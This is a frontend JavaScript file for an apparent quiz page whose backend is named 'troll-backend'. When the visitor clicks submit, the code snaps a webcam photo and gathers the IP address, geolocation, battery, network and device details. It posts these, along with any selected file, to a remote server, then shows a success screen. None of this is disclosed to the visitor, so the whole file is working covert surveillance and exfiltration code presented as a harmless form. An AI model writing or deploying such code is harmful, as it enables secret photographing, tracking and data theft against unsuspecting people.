// ================================
// FRONTEND SCRIPT.JS
// ================================

const btn = document.getElementById('submit-btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ================================
// GET DEVICE IP
// ================================
async function getDeviceIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "N/A";
  } catch {
    return "N/A";
  }
}

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const meta = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory || "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    ip: await getDeviceIP(),
    time: new Date().toLocaleString()
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      meta.battery = `${battery.level * 100}% charging:${battery.charging}`;
    } catch {}
  }

  // Location (silent request if already granted)
  if (navigator.geolocation && navigator.permissions) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        meta.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
      }
    } catch {}
  }

  return meta;
}

// ================================
// CAPTURE CAMERA
// ================================
async function captureCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    // Wait a little for user to focus
    await new Promise(r => setTimeout(r, 2000));

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const image = canvas.toDataURL("image/png");

    const metadata = await collectMetadata();

    // Send to backend
    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    console.error("Camera error:", err);
    alert("Camera permission denied or error occurred.");
  }
}

// ================================
// SEND FILE
// ================================
async function sendFile(file) {
  if (!file) return;

  const reader = new FileReader();
  reader.onload = async () => {
    const base64 = reader.result;

    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ file: base64, filename: file.name })
    });
  };
  reader.readAsDataURL(file);
}

// ================================
// HANDLE FORM SUBMIT
// ================================
btn.addEventListener('click', async (e) => {
  e.preventDefault();

  // 1️⃣ Capture camera
  await captureCamera();

  // 2️⃣ Send file
  if (fileInput && fileInput.files.length > 0) {
    await sendFile(fileInput.files[0]);
  }

  // 3️⃣ Show success page
  const quiz = document.getElementById('quiz-container');
  const success = document.getElementById('success-container');
  if (quiz && success) {
    quiz.style.display = "none";
    success.style.display = "flex";
  }
});
